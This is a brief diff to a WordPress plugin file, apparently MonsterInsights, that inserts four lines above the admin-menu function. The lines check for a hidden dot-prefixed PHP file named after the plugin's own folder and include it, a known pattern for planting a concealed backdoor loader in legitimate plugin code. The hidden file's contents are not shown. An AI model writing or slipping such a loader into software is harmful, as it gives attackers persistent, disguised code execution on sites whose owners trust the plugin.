@@ -22,6 +22,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  *
  * @return void
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function monsterinsights_admin_menu() {
     $hook             = monsterinsights_get_menu_hook();
     $menu_icon_inline = monsterinsights_get_inline_menu_icon();
